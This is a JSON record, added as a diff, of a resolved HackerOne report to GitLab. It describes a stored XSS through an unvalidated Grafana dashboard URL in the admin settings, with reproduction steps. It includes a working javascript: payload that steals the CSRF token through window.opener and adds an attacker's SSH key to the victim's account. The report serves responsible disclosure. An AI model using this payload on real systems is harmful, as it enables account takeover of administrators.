@@ -1,0 +1,123 @@
+{
+  "id": 684268,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82ODQyNjg=",
+  "url": "https://hackerone.com/reports/684268",
+  "title": "Stored XSS for Grafana dashboard URL",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-08-29T09:32:53.883Z",
+  "submitted_at": "2019-08-29T09:32:53.883Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "xanbanx",
+    "url": "/xanbanx",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-07-13T15:12:56.383Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-07-13T15:12:56.207Z",
+  "team_member_agreed_on_going_public_at": "2022-07-01T10:52:46.064Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi GitLab Security Team \n\n### Summary\n\nI found a stored XSS vulnerability in the admins page. The administrator can set up a Grafana dashboard. Here, the administrator can either enter a relative URL or an absolute address. However, when adding an absolute URL, the protocol is not checked allowing to add a Javascript payload. However, when clicking on the URL, the corresponding `<a>` contains the `target=\"_blank\"` attribute, which means a new tab is opened. However, by exploiting the `window.opener` attribute, I still can access the original tab allowing me to steal for example the CSRF token.\n\n### Steps to reproduce\n\nTested locally on GitLab Enterprise 12.3.0-pre 7e45734123b\n\n1. As an administrator go to `http://example.gitlab.com/admin/application_settings/metrics_and_profiling#js-grafana-settings`\n2. Enter the following payload `javascript:alert(window.opener.document.location)`\n3. Within the admin sidebar open `Monitoring ->  Metrics Dashboard`\n\nSee the the Javascript being executed\n\n### Impact\n\nStored Javascript code is being executed on behalf of another user's session. Although this is only visible within the admins page, it's severity is the same. A malicious administrator can attack other administrator users with that. For example, the CSRF token can be stolen allowing, i.e., to add the attacker's SSH key to the victims user account. This can be done for example using the following payload:\n\n```\njavascript:var csrf = window.opener.$('meta[name=csrf-token]').attr('content'); window.opener.$.post('/profile/keys', { 'authenticity_token': csrf, 'key[key]': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUXhvMZ/BFqgVY4iWWv2lrs2alZHA6CoNcnZWH7gxObXGeFK89/itFbI8NrEDE291LRScBL1nuHs0xlf7uidf97uFGVMyIW8TKeaG/j5q6olr9ejiOZhiiGGkQZf1iSTV4VYN77EtG7iV62VB1ZbwnCau1xT5mlXbd8E4WzaHIxuOY8Ao8EozouaQzWt+I1xJx5rufVwItmTaX5QKV5Cuv8GhMRUb1UqujNKr22/rbWnut0pSzB1+uE4S4E1AaCNX9Byy0z65nzupk5kdj8y/qJ3pk8UBOgQtJCFEOwc42EHS3JwTeMRNRXs9bwqRJfXUomXL1LZ5Eua7UX7aQq7pf admin@foo.com', 'key[title]': 'admin@foo.com' });\n```\n\n### What is the current *bug* behavior?\n\nThe URL entered in the Grafana domain is not validated allowing arbitrary javascript being entered.\n\n### What is the expected *correct* behavior?\n\nThe URL input field should only allow valid URLs for http(s).\n\n### Relevant logs and/or screenshots\n\n(Paste any relevant logs - please use code blocks (```) to format console output,\nlogs, and code as it's very hard to read otherwise.)\n\n### Output of checks\n\n#### Results of GitLab environment info\n\n```\nSystem information\nSystem:         Ubuntu 18.04\nProxy:          no\nCurrent User:   xanbanx\nUsing RVM:      no\nRuby Version:   2.6.3p62\nGem Version:    3.0.3\nBundler Version:1.17.2\nRake Version:   12.3.2\nRedis Version:  4.0.9\nGit Version:    2.23.0\nSidekiq Version:5.2.7\nGo Version:     go1.12.6 linux/amd64\n\nGitLab information\nVersion:        12.3.0-pre\nRevision:       7e45734123b\nDirectory:      /home/xanbanx/gdk/gdk-ee/gitlab\nDB Adapter:     PostgreSQL\nDB Version:     10.10\nURL:            http://localhost:3001\nHTTP Clone URL: http://localhost:3001/some-group/some-project.git\nSSH Clone URL:  ssh://xanbanx@localhost:2222/some-group/some-project.git\nElasticsearch:  no\nGeo:            no\nUsing LDAP:     no\nUsing Omniauth: yes\nOmniauth Providers: \n\nGitLab Shell\nVersion:        9.4.1\nRepository storage paths:\n- default:      /home/xanbanx/gdk/gdk-ee/repositories\nGitLab Shell path:              /home/xanbanx/gdk/gdk-ee/gitlab-shell\nGit:            /usr/bin/git\n\n```\n\nBest,\nXanbanx\n\n## Impact\n\nSee above",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 21,
+  "voters": [
+    "drsniper",
+    "thruster",
+    "zy9ard3",
+    "mr-k0anti",
+    "shreyaschavhan",
+    "run_win",
+    "2026",
+    "kmxx",
+    "rahmi",
+    "khizer47",
+    "and 11 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
